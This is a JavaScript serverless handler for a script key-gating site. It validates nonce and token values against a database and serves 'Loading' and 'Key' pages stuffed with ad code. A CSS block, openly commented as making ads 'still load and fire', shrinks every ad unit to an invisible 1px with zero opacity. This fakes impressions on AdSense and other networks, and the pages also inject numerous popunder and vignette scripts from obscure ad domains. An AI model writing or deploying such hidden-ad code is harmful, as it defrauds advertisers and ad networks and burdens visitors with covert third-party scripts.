import { neon } from '@neondatabase/serverless';
import { pageUrl, renderPage } from './_shared.js';

const sql = neon(process.env.DATABASE_URL);

const isHub = (h) => typeof h === 'string' && /^[a-z0-9_-]{1,24}$/.test(h);
const isHex = (v) => typeof v === 'string' && /^[a-f0-9]{32}$/.test(v);

// ---- shared ad chrome for the two inline pages ----
const AD_HEAD = `
<script async src="https://www.googletagmanager.com/gtm.js?id=GTM-MF9MT7J6"></script>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3893185157459343" crossorigin="anonymous"></script>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{margin:0;min-height:100vh;display:grid;place-items:center;background:#000;color:#fff;font-family:-apple-system,'Inter',Segoe UI,sans-serif;text-align:center;padding:24px}
  .ad{display:flex;justify-content:center;margin:14px 0;overflow:hidden}
  .wide{display:none}.rail{display:none}
  @media(min-width:840px){.wide{display:flex;justify-content:center;margin:14px auto}.rail{display:block;position:fixed;top:120px;z-index:1}.rail.l{left:calc(50% - 405px)}.rail.r{right:calc(50% - 405px)}}

  /* ==== ADS: still load and fire, but scaled 10x and clipped to 1px ==== */
  .ad, .wide, .rail {
    overflow: hidden !important;
    height: 1px !important;
    width: 1px !important;
    margin: 0 !important;
    padding: 0 !important;
    opacity: 0 !important;
    pointer-events: none !important;
  }
  .ad > *, .wide > *, .rail > * {
    transform: scale(10) !important;
    transform-origin: top left !important;
  }
</style>
<script>
function adBanner(k,w,h,min){if(innerWidth<min)return;document.write('<scr'+'ipt>atOptions={"key":"'+k+'","format":"iframe","height":'+h+',"width":'+w+',"params":{}};</scr'+'ipt><scr'+'ipt src="https://bauval.org/22/'+k+'"></scr'+'ipt>')}
</script>
`;

const AD_RAILS = `
<div class="rail l"><script>adBanner('980accb5247e3b507876a5598c5dac63',160,600,840)</script></div>
<div class="rail r"><script>adBanner('e7d297afa4abe6d8e9ae4b6d4a9e413e',160,300,840)</script></div>
`;

const AD_TOP = `<div class="ad"><script>adBanner('c1e961c0589310bb251d53941c12fbb1',320,50,0)</script></div>`;

const AD_BOTTOM = `
<div class="wide"><script>adBanner('a973ad4d1946ecff433073faf4287a75',728,90,840)</script></div>
<div class="ad"><script>adBanner('a60c9cdf9090006b20d869deedf8faef',300,250,0)</script></div>
<div class="ad"><script async="async" data-cfasync="false" src="https://bauval.org/21/83e2d8f4007a7f9643ce1333685516fb"></script><div id="container-83e2d8f4007a7f9643ce1333685516fb"></div></div>
<a href="https://araplhn.org/4/f807188adb57a12ed0dc88c5f090b8f3" target="_blank" rel="noopener sponsored" style="display:block;text-align:center;margin:14px 0 4px;font-size:13px;color:rgba(235,235,245,.6);text-decoration:underline">Support us: visit our sponsor (optional)</a>
`;

const AD_TAGS = `
<script src="https://5gvci.com/act/files/tag.min.js?z=12265052" data-cfasync="false" async></script>
<script src="https://5gvci.com/act/files/tag.min.js?z=12265060" data-cfasync="false" async></script>
<script src="https://5gvci.com/act/files/tag.min.js?z=12265063" data-cfasync="false" async></script>
<script src="https://5gvci.com/act/files/tag.min.js?z=12265075" data-cfasync="false" async></script>
<script>(function(s){s.dataset.zone='12265057',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<script>(function(s){s.dataset.zone='12265059',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<script>(function(s){s.dataset.zone='12265062',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<script>(function(s){s.dataset.zone='12265071',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<script>(function(s){s.dataset.zone='12265058',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<script src="https://quge5.com/88/tag.min.js" data-zone="307027" async data-cfasync="false"></script>
<script src="https://quge5.com/88/tag.min.js" data-zone="308573" async data-cfasync="false"></script>
<script>(function(s){s.dataset.zone='12267246',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<script>(function(s){s.dataset.zone='12267249',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<script data-cfasync="false" src="https://bauval.org/14/ca3799816ffb85d7fc27ab6dc9ff2222"></script>
<script data-cfasync="false" src="https://abscloud.org/1/5c130b03e11c03b9f07572a8332254ef"></script>
`;

function noHubPage() {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Key</title>
${AD_HEAD}
</head><body>
${AD_RAILS}
${AD_TOP}
<p>Open this page from the link inside your script.</p>
${AD_BOTTOM}
${AD_TAGS}
</body></html>`;
}

// 1) /api/start?hub=hub1            -> entry used by the scripts (goes to the key page if a key is valid, otherwise starts the steps)
// 2) /api/start?nonce=...&k=...     -> the "start" page of the steps
export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');

  const { nonce, k } = req.query;
  if (nonce !== undefined || k !== undefined) {
    try {
      if (!isHex(nonce) || !isHex(k)) return res.redirect(302, '/api/start');
      const rows = await sql`
        SELECT step, step_token, used FROM sessions
        WHERE nonce = ${nonce} AND created_at > NOW() - INTERVAL '1 hour'
      `;
      if (!rows || rows.length === 0 || rows[0].used || !rows[0].step_token) {
        return res.redirect(302, '/api/start');
      }
      const s = rows[0];
      if (k !== s.step_token) return res.redirect(302, pageUrl(s.step, nonce, s.step_token));
      return res.status(200).send(renderPage(nonce, s.step_token, s.step, 0));
    } catch (err) {
      return res.status(500).send('Server error');
    }
  }

  const hub = String(req.query.hub || '').toLowerCase();
  if (!isHub(hub)) return res.status(200).send(noHubPage());

  return res.status(200).send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Loading</title>
${AD_HEAD}
</head><body>
${AD_RAILS}
${AD_TOP}
<p>Loading...</p>
${AD_BOTTOM}
<script>
setTimeout(function(){
  try{var k=JSON.parse(localStorage.getItem('wowhub_keys')||'{}')['${hub}'];if(k&&new Date(k.expiry)>new Date()){location.replace('/index.html?hub=${hub}');return;}}catch(e){}
  location.replace('/api/begin?hub=${hub}');
}, 800);
</script>
<noscript><a href="/api/begin?hub=${hub}" style="color:#fff">Continue</a></noscript>
${AD_TAGS}
</body></html>`);
}
